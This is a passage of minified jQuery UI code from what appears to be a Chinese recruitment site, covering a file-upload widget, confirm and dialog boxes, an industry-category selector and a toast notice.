                r._addConvenienceMethods(n, i),
                c = r._trigger("add", v.Event("add", {
                    delegatedEvent: n
                }), i)
            }),
            c
        },
        _replaceFileInput: function(e) {
            var i = e.fileInput
              , n = i.clone(!0)
              , t = i.is(document.activeElement);
            e.fileInputClone = n,
            v("<form></form>").append(n)[0].reset(),
            i.after(n).detach(),
            t && n.focus(),
            v.cleanData(i.unbind("remove")),
            this.options.fileInput = this.options.fileInput.map(function(e, t) {
                return t === i[0] ? n[0] : t
            }),
            i[0] === this.element[0] && (this.element = n)
        },
        _handleFileTreeEntry: function(t, i) {
            var e, n = this, a = v.Deferred(), o = [], s = function(e) {
                e && !e.entry && (e.entry = t),
                a.resolve([e])
            }, r = function(e) {
                n._handleFileTreeEntries(e, i + t.name + "/").done(function(e) {
                    a.resolve(e)
                }).fail(s)
            }, c = function() {
                e.readEntries(function(e) {
                    e.length ? (o = o.concat(e),
                    c()) : r(o)
                }, s)
            };
            return i = i || "",
            t.isFile ? t._file ? (t._file.relativePath = i,
            a.resolve(t._file)) : t.file(function(e) {
                e.relativePath = i,
                a.resolve(e)
            }, s) : t.isDirectory ? (e = t.createReader(),
            c()) : a.resolve([]),
            a.promise()
        },
        _handleFileTreeEntries: function(e, t) {
            var i = this;
            return v.when.apply(v, v.map(e, function(e) {
                return i._handleFileTreeEntry(e, t)
            })).then(function() {
                return Array.prototype.concat.apply([], arguments)
            })
        },
        _getDroppedFiles: function(e) {
            var t = (e = e || {}).items;
            return t && t.length && (t[0].webkitGetAsEntry || t[0].getAsEntry) ? this._handleFileTreeEntries(v.map(t, function(e) {
                var t;
                return e.webkitGetAsEntry ? ((t = e.webkitGetAsEntry()) && (t._file = e.getAsFile()),
                t) : e.getAsEntry()
            })) : v.Deferred().resolve(v.makeArray(e.files)).promise()
        },
        _getSingleFileInputFiles: function(e) {
            (e = v(e)).prop("webkitEntries") || e.prop("entries");
            var t = v.makeArray(e.prop("files"));
            if (t.length)
                void 0 === t[0].name && t[0].fileName && v.each(t, function(e, t) {
                    t.name = t.fileName,
                    t.size = t.fileSize
                });
            else {
                if (!(e = e.prop("value")))
                    return v.Deferred().resolve([]).promise();
                t = [{
                    name: e.replace(/^.*\\/, "")
                }]
            }
            return v.Deferred().resolve(t).promise()
        },
        _getFileInputFiles: function(e) {
            return e instanceof v && 1 !== e.length ? v.when.apply(v, v.map(e, this._getSingleFileInputFiles)).then(function() {
                return Array.prototype.concat.apply([], arguments)
            }) : this._getSingleFileInputFiles(e)
        },
        _onChange: function(t) {
            var i = this
              , n = {
                fileInput: v(t.target),
                form: v(t.target.form)
            };
            this._getFileInputFiles(n.fileInput).always(function(e) {
                n.files = e,
                i.options.replaceFileInput && i._replaceFileInput(n),
                !1 !== i._trigger("change", v.Event("change", {
                    delegatedEvent: t
                }), n) && i._onAdd(t, n)
            })
        },
        _onPaste: function(e) {
            var t = e.originalEvent && e.originalEvent.clipboardData && e.originalEvent.clipboardData.items
              , i = {
                files: []
            };
            t && t.length && (v.each(t, function(e, t) {
                t = t.getAsFile && t.getAsFile();
                t && i.files.push(t)
            }),
            !1 !== this._trigger("paste", v.Event("paste", {
                delegatedEvent: e
            }), i) && this._onAdd(e, i))
        },
        _onDrop: function(t) {
            t.dataTransfer = t.originalEvent && t.originalEvent.dataTransfer;
            var i = this
              , e = t.dataTransfer
              , n = {};
            e && e.files && e.files.length && (t.preventDefault(),
            this._getDroppedFiles(e).always(function(e) {
                n.files = e,
                !1 !== i._trigger("drop", v.Event("drop", {
                    delegatedEvent: t
                }), n) && i._onAdd(t, n)
            }))
        },
        _onDragOver: e("dragover"),
        _onDragEnter: e("dragenter"),
        _onDragLeave: e("dragleave"),
        _initEventHandlers: function() {
            this._isXHRUpload(this.options) && (this._on(this.options.dropZone, {
                dragover: this._onDragOver,
                drop: this._onDrop,
                dragenter: this._onDragEnter,
                dragleave: this._onDragLeave
            }),
            this._on(this.options.pasteZone, {
                paste: this._onPaste
            })),
            v.support.fileInput && this._on(this.options.fileInput, {
                change: this._onChange
            })
        },
        _destroyEventHandlers: function() {
            this._off(this.options.dropZone, "dragenter dragleave dragover drop"),
            this._off(this.options.pasteZone, "paste"),
            this._off(this.options.fileInput, "change")
        },
        _destroy: function() {
            this._destroyEventHandlers()
        },
        _setOption: function(e, t) {
            var i = -1 !== v.inArray(e, this._specialOptions);
            i && this._destroyEventHandlers(),
            this._super(e, t),
            i && (this._initSpecialOptions(),
            this._initEventHandlers())
        },
        _initSpecialOptions: function() {
            var e = this.options;
            void 0 === e.fileInput ? e.fileInput = this.element.is('input[type="file"]') ? this.element : this.element.find('input[type="file"]') : e.fileInput instanceof v || (e.fileInput = v(e.fileInput)),
            e.dropZone instanceof v || (e.dropZone = v(e.dropZone)),
            e.pasteZone instanceof v || (e.pasteZone = v(e.pasteZone))
        },
        _getRegExp: function(e) {
            var e = e.split("/")
              , t = e.pop();
            return e.shift(),
            new RegExp(e.join("/"),t)
        },
        _isRegExpOption: function(e, t) {
            return "url" !== e && "string" === v.type(t) && /^\/.*\/[igm]{0,3}$/.test(t)
        },
        _initDataAttributes: function() {
            var n = this
              , a = this.options
              , o = this.element.data();
            v.each(this.element[0].attributes, function(e, t) {
                var i, t = t.name.toLowerCase();
                /^data-/.test(t) && (t = t.slice(5).replace(/-[a-z]/g, function(e) {
                    return e.charAt(1).toUpperCase()
                }),
                i = o[t],
                n._isRegExpOption(t, i) && (i = n._getRegExp(i)),
                a[t] = i)
            })
        },
        _create: function() {
            this._initDataAttributes(),
            this._initSpecialOptions(),
            this._slots = [],
            this._sequence = this._getXHRPromise(!0),
            this._sending = this._active = 0,
            this._initProgressObject(this),
            this._initEventHandlers()
        },
        active: function() {
            return this._active
        },
        progress: function() {
            return this._progress
        },
        add: function(t) {
            var i = this;
            t && !this.options.disabled && (t.fileInput && !t.files ? this._getFileInputFiles(t.fileInput).always(function(e) {
                t.files = e,
                i._onAdd(null, t)
            }) : (t.files = v.makeArray(t.files),
            this._onAdd(null, t)))
        },
        send: function(t) {
            if (t && !this.options.disabled) {
                var i, n, e, a, o;
                if (t.fileInput && !t.files)
                    return i = this,
                    n = v.Deferred(),
                    (e = n.promise()).abort = function() {
                        return o = !0,
                        a ? a.abort() : (n.reject(null, "abort", "abort"),
                        e)
                    }
                    ,
                    this._getFileInputFiles(t.fileInput).always(function(e) {
                        o || (e.length ? (t.files = e,
                        (a = i._onSend(null, t)).then(function(e, t, i) {
                            n.resolve(e, t, i)
                        }, function(e, t, i) {
                            n.reject(e, t, i)
                        })) : n.reject())
                    }),
                    this._enhancePromise(e);
                if (t.files = v.makeArray(t.files),
                t.files.length)
                    return this._onSend(null, t)
            }
            return this._getXHRPromise(!1, t && t.context)
        }
    })
}),
"undefined" == typeof jQuery)
    throw new Error("jquery-confirm requires jQuery");
function Utemplate(e, t) {
    var i = /<%([^%>]+)?%>/g
      , n = /(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g
      , a = "var arr = []; \n"
      , o = 0;
    function s(e, t) {
        return a += t ? e.match(n) ? e + "\n" : "arr.push(" + e + ");\n" : "" != e ? "arr.push('" + e.replace(/"/g, '\\"') + "');\n" : "",
        arguments.callee
    }
    for (; match = i.exec(e); )
        s(e.slice(o, match.index))(match[1], !0),
        o = match.index + match[0].length;
    return s(e.substr(o, e.length - o)),
    a += "return arr.join('')",
    new Function(a.replace(/[\r\t\n]/g, "")).apply(t)
}
!function(a) {
    "use strict";
    a.fn.confirm = function(i, e) {
        return "string" == typeof (i = void 0 === i ? {} : i) && (i = {
            content: i,
            title: e || !1
        }),
        a(this).each(function() {
            var t = a(this);
            t.on("click", function(e) {
                e.preventDefault();
                e = a.extend({}, i);
                t.attr("data-title") && (e.title = t.attr("data-title")),
                t.attr("data-content") && (e.content = t.attr("data-content")),
                (e.$target = t).attr("href") && !i.confirm && (e.confirm = function() {
                    location.href = t.attr("href")
                }
                ),
                a.confirm(e)
            })
        }),
        a(this)
    }
    ,
    a.confirm = function(e, t) {
        return jconfirm(e = "string" == typeof (e = void 0 === e ? {} : e) ? {
            content: e,
            title: t || !1
        } : e)
    }
    ,
    a.alert = function(e, t) {
        return (e = "string" == typeof (e = void 0 === e ? {} : e) ? {
            content: e,
            title: t || !1
        } : e).cancelButton = !1,
        jconfirm(e)
    }
    ,
    jconfirm = function(e) {
        void 0 === e && (e = {}),
        jconfirm.defaults && a.extend(jconfirm.pluginDefaults, jconfirm.defaults);
        e = a.extend({}, jconfirm.pluginDefaults, e);
        return new Jconfirm(e)
    }
    ,
    (Jconfirm = function(e) {
        a.extend(this, e),
        this._init()
    }
    ).prototype = {
        _init: function() {
            var e = this;
            this._rand = Math.round(99999 * Math.random()),
            this._buildHTML(),
            this._bindEvents(),
            setTimeout(function() {
                e.open(),
                e._watchContent()
            }, 0)
        },
        _buildHTML: function() {
            var e = this;
            this.animation = "anim-" + this.animation.toLowerCase(),
            this.closeAnimation = "anim-" + this.closeAnimation.toLowerCase(),
            this.theme = "jconfirm-" + this.theme.toLowerCase(),
            "anim-none" == this.animation && (this.animationSpeed = 0),
            this._lastFocused = a("body").find(":focus"),
            this.$el = a(this.template).appendTo(this.container).addClass(this.theme),
            this.$el.find(".jconfirm-box-container").addClass(this.columnClass),
            this.$el.find(".jconfirm-bg").css(this._getCSS(this.animationSpeed, 1)),
            this.$el.find(".jconfirm-bg").css("opacity", this.opacity),
            this.$b = this.$el.find(".jconfirm-box").css(this._getCSS(this.animationSpeed, this.animationBounce)).addClass(this.animation),
            this.$body = this.$b,
            this.rtl && this.$el.addClass("rtl"),
            this._contentReady = a.Deferred(),
            this._modalReady = a.Deferred(),
            this.$title = this.$el.find(".title"),
            this.contentDiv = this.$el.find("div.content"),
            this.$content = this.contentDiv,
            this.$contentPane = this.$el.find(".content-pane"),
            this.$icon = this.$el.find(".icon-c"),
            this.$closeIcon = this.$el.find(".closeIcon"),
            this.$contentPane.css(this._getCSS(this.animationSpeed, 1)),
            this.setTitle(),
            this.setIcon(),
            this._setButtons(),
            this.closeIconClass && this.$closeIcon.html('<i class="' + this.closeIconClass + '"></i>'),
            e._contentHash = this._hash(e.$content.html()),
            a.when(this._contentReady, this._modalReady).then(function() {
                e.setContent(),
                e.setTitle(),
                e.setIcon()
            }),
            this._getContent(),
            this._imagesLoaded(),
            this.autoClose && this._startCountDown()
        },
        _unwatchContent: function() {
            clearInterval(this._timer)
        },
        _hash: function() {
            if ("function" == typeof btoa)
                return btoa(encodeURIComponent(this.$content.html()))
        },
        _watchContent: function() {
            var t = this;
            this._timer = setInterval(function() {
                var e = t._hash(t.$content.html());
                t._contentHash != e && (t._contentHash = e,
                t.setDialogCenter(),
                t._imagesLoaded())
            }, this.watchInterval)
        },
        _bindEvents: function() {
            var t = this
              , i = !1;
            this.$el.find(".jconfirm-scrollpane").click(function(e) {
                i || t.backgroundDismiss && (t.cancel(),
                t.close()),
                i = !1
            }),
            this.$el.find(".jconfirm-box").click(function(e) {
                i = !0
            }),
            this.$confirmButton && this.$confirmButton.click(function(e) {
                e.preventDefault();
                e = t.confirm(t.$b);
                t._stopCountDown(),
                t.onAction("confirm"),
                void 0 !== e && !e || t.close()
            }),
            this.$cancelButton && this.$cancelButton.click(function(e) {
                e.preventDefault();
                e = t.cancel(t.$b);
                t._stopCountDown(),
                t.onAction("cancel"),
                void 0 !== e && !e || t.close()
            }),
            this.$closeButton && this.$closeButton.click(function(e) {
                e.preventDefault(),
                t._stopCountDown(),
                t.cancel(),
                t.onAction("close"),
                t.close()
            }),
            this.keyboardEnabled && setTimeout(function() {
                a(window).on("keyup." + this._rand, function(e) {
                    t.reactOnKey(e)
                })
            }, 500),
            a(window).on("resize." + this._rand, function() {
                t.setDialogCenter(!0)
            })
        },
        _getCSS: function(e, t) {
            return {
                "-webkit-transition-duration": e / 1e3 + "s",
                "transition-duration": e / 1e3 + "s",
                "-webkit-transition-timing-function": "cubic-bezier(.36,1.1,.2, " + t + ")",
                "transition-timing-function": "cubic-bezier(.36,1.1,.2, " + t + ")"
            }
        },
        _imagesLoaded: function() {
            var n = this;
            a.each(this.$content.find("img:not(.loaded)"), function(e, t) {
                var i = setInterval(function() {
                    "0px" !== a(t).css("height") && (a(t).addClass("loaded"),
                    n.setDialogCenter(),
                    clearInterval(i))
                }, 40)
            })
        },
        _setButtons: function() {
            this.$btnc = this.$el.find(".buttons"),
            this.confirmButton && "" !== a.trim(this.confirmButton) && (this.$confirmButton = a('<button type="button" class="btn">' + this.confirmButton + "</button>").appendTo(this.$btnc).addClass(this.confirmButtonClass)),
            this.cancelButton && "" !== a.trim(this.cancelButton) && (this.buttonsReverse ? this.$cancelButton = a('<button type="button" class="btn">' + this.cancelButton + "</button>").prependTo(this.$btnc).addClass(this.cancelButtonClass) : this.$cancelButton = a('<button type="button" class="btn">' + this.cancelButton + "</button>").appendTo(this.$btnc).addClass(this.cancelButtonClass)),
            this.buttonOther && "" !== a.trim(this.buttonOther) && a(this.buttonOther).prependTo(this.$btnc),
            this.confirmButton || this.cancelButton || this.$btnc.hide(),
            this.confirmButton || this.cancelButton || null !== this.closeIcon || (this.$closeButton = this.$b.find(".closeIcon").show()),
            !0 === this.closeIcon && (this.$closeButton = this.$b.find(".closeIcon").show())
        },
        setTitle: function(e) {
            this.title = void 0 !== e ? e : this.title,
            this.$title.html(this.title || "")
        },
        setIcon: function(e) {
            this.title = "undefined" != typeof string ? e : this.title,
            this.$icon.html(this.icon ? '<i class="' + this.icon + '"></i>' : "")
        },
        setContent: function(e) {
            this.content = void 0 === e ? this.content : e,
            "" == this.content ? (this.$content.html(this.content),
            this.$contentPane.hide()) : (this.$content.html(this.content),
            this.$contentPane.show()),
            this.$content.hasClass("loading") && (this.$content.removeClass("loading"),
            this.$btnc.find("button").prop("disabled", !1))
        },
        _getContent: function(e) {
            var n = this;
            e = e || this.content,
            this._isAjax = !1,
            this.content ? "string" == typeof this.content ? "url:" === this.content.substr(0, 4).toLowerCase() ? (this._isAjax = !0,
            this.$content.addClass("loading"),
            this.$btnc.find("button").prop("disabled", !0),
            e = this.content.substring(4, this.content.length),
            a.get(e).done(function(e) {
                n.content = e,
                n._contentReady.resolve()
            }).always(function(e, t, i) {
                "function" == typeof n.contentLoaded && n.contentLoaded(e, t, i)
            })) : (this.setContent(this.content),
            this._contentReady.reject()) : "function" == typeof this.content ? (this.$content.addClass("loading"),
            this.$btnc.find("button").attr("disabled", "disabled"),
            "object" != typeof (e = this.content(this)) ? console.error("The content function must return jquery promise.") : "function" != typeof e.always ? console.error("The object returned is not a jquery promise.") : (this._isAjax = !0,
            e.always(function(e, t) {
                n._contentReady.resolve()
            }))) : console.error("Invalid option for property content, passed: " + typeof this.content) : (this.content = "",
            this.setContent(this.content),
            this._contentReady.reject()),
            this.setDialogCenter()
        },
        _stopCountDown: function() {
            clearInterval(this.timerInterval),
            this.$cd && this.$cd.remove()
        },
        _startCountDown: function() {
            var e, t, i = this.autoClose.split("|");
            if (/cancel/.test(i[0]) && "alert" === this.type)
                return !1;
            /confirm|cancel/.test(i[0]) ? (this.$cd = a('<span class="countdown"></span>').appendTo(this["$" + i[0] + "Button"]),
            (e = this).$cd.parent().click(),
            t = i[1] / 1e3,
            this.timerInterval = setInterval(function() {
                e.$cd.html(" (" + --t + ")"),
                0 === t && (e.$cd.html(""),
                e.$cd.parent().trigger("click"),
                clearInterval(e.timerInterval))
            }, 1e3)) : console.error("Invalid option " + i[0] + ", must be confirm/cancel")
        },
        reactOnKey: function(e) {
            var t = a(".jconfirm");
            return t.eq(t.length - 1)[0] === this.$el[0] && (t = e.which,
            (!this.contentDiv.find(":input").is(":focus") || !/13|32/.test(t)) && (-1 !== a.inArray(t, this.cancelKeys) && (this.$cancelButton ? this.$cancelButton.click() : this.close()),
            void (-1 !== a.inArray(t, this.confirmKeys) && this.$confirmButton && this.$confirmButton.click())))
        },
        setDialogCenter: function() {
            "none" == this.$contentPane.css("display") ? i = n = 0 : (n = this.$content.outerHeight(),
            0 == (i = this.$contentPane.height()) && (i = n));
            var e, t = this.$content.outerWidth(), t = (this.$content.css({
                clip: "rect(0px " + (100 + t) + "px " + n + "px -100px)"
            }),
            this.$contentPane.css({
                height: n
            }),
            a(window).height()), i = this.$b.outerHeight() - i + n, n = (t - i) / 2;
            t - 100 < i ? (e = {
                "margin-top": 50,
                "margin-bottom": 50
            },
            a("body").addClass("jconfirm-noscroll")) : (e = {
                "margin-top": n
            },
            a("body").removeClass("jconfirm-noscroll")),
            this.$b.css(e)
        },
        close: function() {
            var e = this;
            if (this.isClosed())
                return !1;
            "function" == typeof this.onClose && this.onClose(),
            this._unwatchContent(),
            e._lastFocused.focus(),
            a(window).unbind("resize." + this._rand),
            this.keyboardEnabled && a(window).unbind("keyup." + this._rand),
            e.$el.find(".jconfirm-bg").removeClass("seen"),
            a("body").removeClass("jconfirm-noscroll"),
            this.$b.addClass(this.closeAnimation);
            var t = "anim-none" == this.closeAnimation ? 0 : this.animationSpeed;
            return setTimeout(function() {
                e.$el.remove()
            }, 25 * t / 100),
            jconfirm.record.closed += 1,
            --jconfirm.record.currentlyOpen,
            !0
        },
        open: function() {
            var e = this;
            if (this.isClosed())
                return !1;
            e.$el.find(".jconfirm-bg").addClass("seen"),
            this.$b.removeClass(this.animation),
            this.$b.find("input[autofocus]:visible:first").focus(),
            jconfirm.record.opened += 1,
            jconfirm.record.currentlyOpen += 1,
            "function" == typeof this.onOpen && this.onOpen();
            var t = "jconfirm-box" + this._rand;
            return this.$b.attr("aria-labelledby", t).attr("tabindex", -1).focus(),
            this.$title ? this.$title.attr("id", t) : this.$content && this.$content.attr("id", t),
            setTimeout(function() {
                e.$b.css({
                    "transition-property": e.$b.css("transition-property") + ", margin"
                }),
                e._modalReady.resolve()
            }, this.animationSpeed),
            !0
        },
        isClosed: function() {
            return "" === this.$el.css("display")
        }
    },
    jconfirm.pluginDefaults = {
        template: '<div class="jconfirm"><div class="jconfirm-bg"></div><div class="jconfirm-scrollpane"><div class="container"><div class="row"><div class="jconfirm-box-container"><div class="jconfirm-box" role="dialog" aria-labelledby="labelled" tabindex="-1"><div class="closeIcon">&times;</div><div class="title-c"><span class="icon-c"></span><span class="title"></span></div><div class="content-pane"><div class="content"></div></div><div class="buttons"></div><div class="jquery-clear"></div></div></div></div></div></div></div>',
        title: "提示",
        content: "确定吗",
        contentLoaded: function() {},
        icon: "",
        opacity: null,
        confirmButton: "确定",
        cancelButton: "取消",
        confirmButtonClass: "btn",
        cancelButtonClass: "btn btn-slight",
        buttonsReverse: !1,
        theme: "white",
        animation: "scale",
        closeAnimation: "none",
        animationSpeed: 500,
        animationBounce: 1.2,
        keyboardEnabled: !1,
        rtl: !1,
        confirmKeys: [13],
        cancelKeys: [27],
        container: "body",
        confirm: function() {},
        cancel: function() {},
        backgroundDismiss: !0,
        autoClose: !1,
        closeIcon: null,
        closeIconClass: !1,
        watchInterval: 100,
        columnClass: "pop-container",
        onOpen: function() {},
        onClose: function() {},
        onAction: function() {}
    },
    jconfirm.record = {
        opened: 0,
        closed: 0,
        currentlyOpen: 0
    }
}(jQuery),
!function(s, o) {
    "use strict";
    s(o),
    s(document),
    -[1] || o.XMLHttpRequest;
    function t(e) {
        this.settings = s.extend({}, t.defaults, e),
        this.init()
    }
    var i = !1;
    t.defaults = {
        bind: !1,
        wrapClass: "",
        content: "请稍等...",
        title: "提示",
        onCancel: null,
        onOpen: null,
        onConfirm: null,
        onClose: null,
        closeText: !0,
        confirmText: "确定",
        cancelText: "取消",
        position: "center",
        inline: !1,
        isSelecter: !1,
        element: null,
        preKa: "",
        autoTime: null,
        lock: !0,
        preventBodyScroll: !1,
        closeLayer: !0,
        opacityLock: !1
    },
    t.prototype = {
        init: function() {
            this.create()
        },
        create: function() {
            var e = ""
              , t = ""
              , i = ""
              , n = ""
              , a = ""
              , o = "";
            this.settings.type && (e = '<i class="icon-dialog icon-dialog-' + this.settings.type + '"></i>'),
            this.settings.lock && (t = '<div class="dialog-layer"></div>',
            this.settings.opacityLock && (t = '<div class="dialog-layer dialog-opacity-layer"></div>')),
            this.settings.preKa && (i = this.settings.preKa + "_"),
            "around" != this.settings.position && !this.settings.inline || (n = '<span class="icon-dialog-arrow"></span>'),
            this.settings.closeText && (a = '<a href="javascript:;" class="close" ka="' + i + 'dialog_close"><i class="icon-close"></i></a>'),
            (this.settings.confirmText || this.settings.cancelText) && (o = '<div class="dialog-footer"><div class="btns"></div></div>'),
            i = '<div class="dialog-wrap">' + t + '<div class="dialog-container">' + n + '<div class="dialog-title">' + e + '<h3 class="title">' + this.settings.title + "</h3>" + a + '</div><div class="dialog-con">' + this.settings.content + "</div>" + o + "</div></div>",
            s(".dialog-wrap").length && !this.settings.inline && s(".dialog-wrap").each(function() {
                s(this).hasClass("v-transfer-dom") || s(this).remove()
            }),
            this.settings.inline && this.settings.element ? this.dialog = s(i).appendTo(s(this.settings.element).parent()) : this.dialog = s(i).appendTo("body"),
            (this.settings.onConfirm || this.settings.confirmText) && this.onConfirm(),
            (this.settings.onCancel && !1 !== this.settings.cancelText || this.settings.cancelText) && this.onCancel(),
            this.settings.wrapClass && this.dialog.addClass(this.settings.wrapClass),
            this.settings.type && this.dialog.addClass("dialog-icons-default"),
            this.settings.position && this.position(),
            this.bindEvent(),
            s("body").addClass("dialog-open"),
            s.isFunction(this.settings.onOpen) && (this.settings.bind ? this.settings.onOpen.apply(this, this.dialog) : this.settings.onOpen(this.dialog)),
            this.settings.lock && this.lock(),
            this.autoInter && clearInterval(this.autoInter),
            s.isNumeric(this.settings.autoTime) && this.autoCloseTimer()
        },
        onConfirm: function() {
            var e = this
              , t = this.dialog.find(".dialog-footer .btns");
            s("<span>", {
                ClASS: "btn btn-sure",
                text: e.settings.confirmText,
                ka: (e.settings.preKa ? e.settings.preKa + "_" : "") + "dialog_confirm",
                click: function() {
                    s.isFunction(e.settings.onConfirm) ? e.settings.bind ? e.settings.onConfirm.apply(e, e.dialog) : e.settings.onConfirm(e.dialog) : e.close("confirm")
                }
            }).prependTo(t)
        },
        onCancel: function() {
            var e = this
              , t = this.dialog.find(".dialog-footer .btns");
            s("<span>", {
                ClASS: "btn btn-outline btn-cancel",
                text: e.settings.cancelText,
                ka: (e.settings.preKa ? e.settings.preKa + "_" : "") + "dialog_cancel",
                click: function() {
                    s.isFunction(e.settings.onCancel) ? e.settings.bind ? e.settings.onCancel.apply(e, e.dialog) : e.settings.onCancel(e.dialog) : e.close("cancel")
                }
            }).prependTo(t)
        },
        size: function() {
            var e = this.dialog.find(".dialog-con");
            this.dialog.find(".dialog-container");
            e.css({
                width: this.settings.width,
                height: this.settings.height
            })
        },
        position: function() {
            var t, i, e, n, a;
            this.settings.element && (i = (t = this).settings.element,
            e = t.dialog.find(".dialog-container").outerWidth(),
            (a = (n = s(i).offset()).left + i.width() / 2) < e && (a = e / 2),
            t.settings.inline || "around" != t.settings.position || t.dialog.css({
                left: a + "px",
                top: n.top + "px"
            }),
            t.settings.inline && (330 < t.dialog.get(0).getBoundingClientRect().top && o.innerHeight - t.dialog.get(0).getBoundingClientRect().top < 280 && t.dialog.addClass("dialog-up-default"),
            t.settings.isSelecter && s(document).on("click", function(e) {
                e.target == i.get(0) || e.target.parentNode == i.get(0) || s(e.target).closest(".dialog-selecter-default").length || (t.dialog.closest(".dropdown-wrap").removeClass("dropdown-menu-open"),
                t.close())
            })))
        },
        lock: function() {
            var e;
            i || ((e = this).dialog.find(".dialog-container"),
            this.settings.preventBodyScroll && s("html,body").css("overflow", "hidden"),
            this.settings.closeLayer && e.dialog.find(".dialog-layer").on("click", function() {
                e.close()
            }),
            this.settings.preventBodyScroll && (i = !0))
        },
        unLock: function() {
            this.settings.lock && i && (s("html,body").css("overflow", "visible"),
            i = !1)
        },
        close: function(e) {
            s.isFunction(this.settings.onClose) && this.settings.onClose(this.dialog, e || ""),
            this.dialog.remove(),
            this.unLock(),
            this.autoInter && clearInterval(this.autoInter),
            s("body").removeClass("dialog-open")
        },
        hide: function(e) {
            s.isFunction(this.settings.onClose) && this.settings.onClose(this.dialog, e || ""),
            this.dialog.hide(),
            this.unLock(),
            s("body").removeClass("dialog-open")
        },
        autoCloseTimer: function() {
            var e = this
              , t = e.dialog.find(".btn-sure")
              , i = e.settings.autoTime
              , n = t.text();
            i && (e.autoInter && clearInterval(e.autoInter),
            e.autoInter = setInterval(function() {
                i <= 1 ? (clearInterval(e.autoInter),
                e.close("timer")) : (i--,
                t.text(n + "(" + i + "s)"))
            }, 1e3))
        },
        bindEvent: function() {
            var e = this;
            this.dialog.find(".close").on("click", function() {
                e.close("")
            }),
            s(o).on("resize.dialog", function() {
                e.settings.onResize && e.settings.onResize(e.dialog)
            })
        }
    },
    s.dialog = function(e) {
        return new t(e)
    }
}(jQuery, window),
!function(o) {
    "use strict";
    Array.prototype.indexOf || (Array.prototype.indexOf = function(e, t) {
        var i;
        if (null == this)
            throw new TypeError('"this" is null or not defined');
        var n = Object(this)
          , a = n.length >>> 0;
        if (0 != a) {
            t = +t || 0;
            if (!(a <= (t = Math.abs(t) === 1 / 0 ? 0 : t)))
                for (i = Math.max(0 <= t ? t : a - Math.abs(t), 0); i < a; ) {
                    if (i in n && n[i] === e)
                        return i;
                    i++
                }
        }
        return -1
    }
    );
    function n(e, t) {
        t = t || {},
        this.selected = [],
        this.$body = o(document.body),
        this.$element = o(e),
        this.option = o.extend({}, t),
        this.init()
    }
    var t = function() {
        var t = o.Deferred();
        return o.get("/wapi/zpCommon/data/industry.json", function(e) {
            t.resolve(e.zpData)
        }),
        t
    }
      , i = function() {
        return '<div class="industry-tip"><div class="industry-tip-item fl"></div><span class="fl gray">最多可选3个行业</span><a class="confirm" href="javascript:;">确定</a></div><div class="industry-panel"><div class="data-tips"><div class="spinner spinner-circle"><div class="loader"></div><span>正在加载数据...</span></div></div></div>'
    }
      , s = function(e, t) {
        var i = "<table>"
          , a = [];
        t && o.each(t, function(e, t) {
            a.push(parseInt(t.code, 10))
        });
        return o.each(e, function(e, t) {
            var n;
            i = (i = (i += "<tr>") + '<td class="industry-category" data-code="' + t.code + '">' + t.name + "</td><td>") + (t = t.subLevelModelList,
            n = "",
            o.each(t, function(e, t) {
                var i = -1 < a.indexOf(t.code) ? "selected" : "";
                n += '<p><span class="' + i + '" data-code="' + t.code + '">' + t.name + "</span></p>"
            }),
            n) + "</td></tr>"
        }),
        i += "</table>"
    }
      , e = (n.prototype.init = function() {
        var e = this
          , t = this.$element;
        if (t.hasClass("disabled"))
            return !1;
        t.off("click").on("click", function() {
            o(".industry-wrapper").length || e.show()
        })
    }
    ,
    n.prototype.toggleSelected = function() {
        var i = this
          , n = "";
        i.selected = [],
        o(".industry-multiple-wrapper .selected").each(function(e, t) {
            i.selected.push({
                name: o(t).text(),
                code: o(t).attr("data-code")
            })
        }),
        o.each(i.selected, function(e, t) {
            n += '<p data-code="' + t.code + '"><span class="text">' + t.name + '</span><i class="i-close"></i></p>'
        }),
        o(".industry-multiple-wrapper .industry-tip-item").html(n)
    }
    ,
    n.prototype.show = function() {
        var a = this
          , e = a.option.multiple ? "industry-multiple-wrapper " : "";
        a.$dialog = o.dialog({
            bind: !0,
            title: "请选择行业类别",
            content: i(),
            closeText: !0,
            confirmText: !1,
            cancelText: !1,
            inline: !0,
            wrapClass: e + "industry-wrapper",
            lock: !0,
            onOpen: function(i) {
                var n = (new Date).getTime();
                o(i).on("click.industry", "table span", function() {
                    var e = {
                        name: o(this).text(),
                        code: o(this).attr("data-code")
                    };
                    a.option.multiple ? (a.selected.length < 3 ? o(this).addClass("selected") : o(this).hasClass("selected") || o.toast({
                        type: "warning",
                        content: "最多可选择3个行业"
                    }),
                    a.toggleSelected()) : (a.$element.trigger("selected.industry", e),
                    a.$element.data("selected", [e]),
                    a.close())
                }),
                o(i).on("click.industry", ".industry-tip .i-close", function() {
                    var e = o(this).parent("p").attr("data-code");
                    o(i).find(".selected[data-code=" + e + "]").removeClass("selected"),
                    a.toggleSelected()
                }),
                o(i).on("click.industry", ".industry-tip .confirm", function() {
                    a.$element.data("selected", a.selected),
                    a.selected.length ? a.$element.trigger("selected.industry", [a.selected]) : a.$element.trigger("selected.industry", [{
                        name: "不限",
                        code: 0
                    }]),
                    a.close()
                }),
                t().then(function(e) {
                    var t = (new Date).getTime() - n;
                    setTimeout(function() {
                        o(i).find(".industry-panel").html(s(e, a.$element.data("selected"))),
                        a.toggleSelected()
                    }, 500 < t ? t : 500 - t)
                })
            },
            onClose: function(e) {
                o(e).off("click.industry")
            }
        })
    }
    ,
    n.prototype.close = function() {
        this.$dialog && this.$dialog.close()
    }
    ,
    o.fn.industry);
    o.fn.industry = function(i) {
        return this.each(function() {
            var e = o(this)
              , t = e.data("boss.industry");
            t || e.data("boss.industry", t = new n(this,i)),
            "string" == typeof i && t[i].call(e)
        })
    }
    ,
    o.fn.industry.Constructor = n,
    o.fn.industry.noConflict = function() {
        return o.fn.industry = e,
        this
    }
}(jQuery),
!function(i, e) {
    "use strict";
    i(e),
    i(document);
    function t(e) {
        this.settings = i.extend({}, t.defaults, e = "string" == typeof e ? {
            content: e
        } : e),
        this.init()
    }
    var n = !1;
    t.defaults = {
        content: "提示",
        lock: !1,
        wrapClass: null,
        type: null,
        position: "top",
        parentWrap: "body",
        time: 2300,
        pending: ""
    },
    t.prototype = {
        init: function() {
            this.create(),
            this.settings.lock && this.lock()
        },
        create: function() {
            var e = ""
              , t = this;
            this.settings.type && (e = '<i class="icon-toast-' + this.settings.type + '"></i>'),
            e = '<div data-pending="' + this.settings.pending + '" id="toast"><div class="toast-con">' + e + this.settings.content + "</div></div>",
            i("#toast").length && i("#toast").remove(),
            this.toast = i(e).appendTo(this.settings.parentWrap),
